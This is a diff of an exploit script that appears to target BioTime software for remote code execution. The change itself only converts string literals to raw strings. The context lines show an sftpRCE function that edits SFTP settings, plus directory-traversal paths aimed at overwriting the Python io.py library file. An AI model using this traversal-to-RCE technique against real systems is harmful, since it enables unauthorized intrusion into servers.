@@ -42,13 +42,13 @@ if len(sys.argv) < 2:
     print(f"Usage: python3 {sys.argv[0]} http://vuln.site.com:88")
     sys.exit(1)
 
-print( "__________.__     ___________.__                ")
-print( "\______   \__| ___\__    ___/|__| _____   ____  ")
-print( " |    |  _/  |/  _ \|    |   |  |/     \_/ __ \ ")
-print( " |    |   \  (  <_> )    |   |  |  Y Y  \  ___/ ")
-print( " |______  /__|\____/|____|   |__|__|_|  /\___  >")
-print( "        \/                            \/     \/ ")
-print( "                    @w3bd3vil - Krash Consulting")
+print(r"__________.__     ___________.__                ")
+print(r"\______   \__| ___\__    ___/|__| _____   ____  ")
+print(r" |    |  _/  |/  _ \|    |   |  |/     \_/ __ \ ")
+print(r" |    |   \  (  <_> )    |   |  |  Y Y  \  ___/ ")
+print(r" |______  /__|\____/|____|   |__|__|_|  /\___  >")
+print(r"        \/                            \/     \/ ")
+print(r"                    @w3bd3vil - Krash Consulting")
 
 target =  sys.argv[1]
 
@@ -408,9 +408,9 @@ def sftpRCE():
     #Edit SFTP (Response can have errors, it doesn't matter)
     print("Editing SFTP Settings")
     if buildNumber == "9":
-        dirTraverse = '\..\..\..\python311\lib\io.py'
+        dirTraverse = r'\..\..\..\python311\lib\io.py'
     else:
-        dirTraverse = '\..\..\..\python37\lib\io.py'
+        dirTraverse = r'\..\..\..\python37\lib\io.py'
 
     if len(dirTraverse) > 30:
         print("Directory Traversal length is greater than 30, will not work!")
